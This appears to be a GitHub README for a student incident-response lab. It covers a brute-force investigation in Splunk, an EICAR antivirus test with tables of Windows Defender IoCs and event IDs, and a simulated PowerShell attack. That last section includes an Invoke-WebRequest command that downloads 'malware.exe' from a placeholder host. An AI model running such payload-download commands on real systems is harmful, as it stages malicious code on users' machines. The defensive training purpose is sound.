# Multi-Incident-Response-Report

## 🔨 Brute-Force Attack Incident Response Report
This project simulates a real-world incident response using a brute-force login attack. I investigated the incident using Splunk logs, documented key Indicators of Compromise (IoCs), and mapped the behaviour to MITRE ATT&CK.
See `Brute_Force_incident_report.md` for the full report. Additionally, to see how a  Brute-force attack was done, please visit my [Splunk-threat-hunting-lab](https://github.com/Mr-ebony/Splunk-threat-hunting-lab.git) project.

## 🦠 Malware Execution Using EICAR (Safe Simulation)

### Steps
+ **Open Browser on the Windows VM**
+ Visit the official EICAR test file site (Please see **Image 1** within Screenshot/Malware )
  🔗 [https://www.eicar.org/download-anti-malware-tesfile/](https://www.eicar.org/download-anti-malware-tesfile/)
+ Download the `eicar.com` file - your antivirus or Windows Defender will likely alert or block it (Please see **Image 1**).
  #### Alternative way to download if it is blocked (Manual Method) (Please see **Image 2**)
  +  Open Notepad (or any text editor)
  +  Paste this exact string on a single line:
  +  ```spl
     X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
     ```
  + Name the file:
    ```spl
    eicar.com
    ```
  + Save it to your *Desktop or a dedicated test folder like `C:\EICAR_TEST`
  ✅ Done! You now have a test virus file.
+ Attempt to run it on your desktop (it will likely get a block event) (Please see **Image 4**).
+ Open **Windows Event Viewer → Applications and Services Logs → Microsoft → Windows → Windows Defender → Operational**, look for logs from `Window Defender`
### Common IOCs that can be extracted from Windows Defender Malware Logs
| IoC Type             | Description / Example           | 
|--------------------|---------------------|
| Timestamp | When the malware was detected         |
|  Threat Name   | Malware family name (e.g., Trojan:Win32/Emotet)      |
| Severity Name | Info/ Low/ Moderate/ High/ Severe         |
| File Path    | Exact path of the infected file (e.g., C:\Users\User\AppData\Temp\badfile.exe)      |
| File Name | Name of the malicious file (badfile.exe)         |
| SHA-256 or MD5    | Hash of the malicious file (if Defender captures it)      |
| Action Name | Quarantined, Removed, Blocked. Allowed         |
| Detection Source Name  | Real-time, Scheduled scan, On-demand Scan, etc.      |
| Process Name | The process that dropped or executed the malware (Powershell.exe, cmd.exe, etc         |
| Remediation Status    | Whether the threat was successfully removed or still active      |
| User | Which user account triggered the detection         |
| Device Name / Hostname    | The machine where the threat was found     |
| IP Address (indirect) | Might be found if malware attempted outbound communication (Check Event ID 5156)         |

### Event IDs to Watch For:
| Event ID             | Meaning           | 
|--------------------|---------------------|
| 1116 | Malware detected         |
| 1117   | Malware action taken      |
| 1118 | Malware cleaned successfully         |
| 5007    | Settings changed      |

## 🧨Powershell Attack
### Steps
+ **Open PowerShell as Administrator on the Windows VM**
+ Run the following harmless but suspicious command:

  ```spl
  
  Invoke-WebRequest -Uri "http://test.com/malware.exe" -OutFile "C:\Users\Public\Downloads\malware.exe"
  ```
  + Check **Windows Event Viewer** under:
    + ` Windows Event Viewer → Applications and Services Logs → Microsoft → Windows → Powershell → Operational`
    + Event ID: `4104` (script block logging)

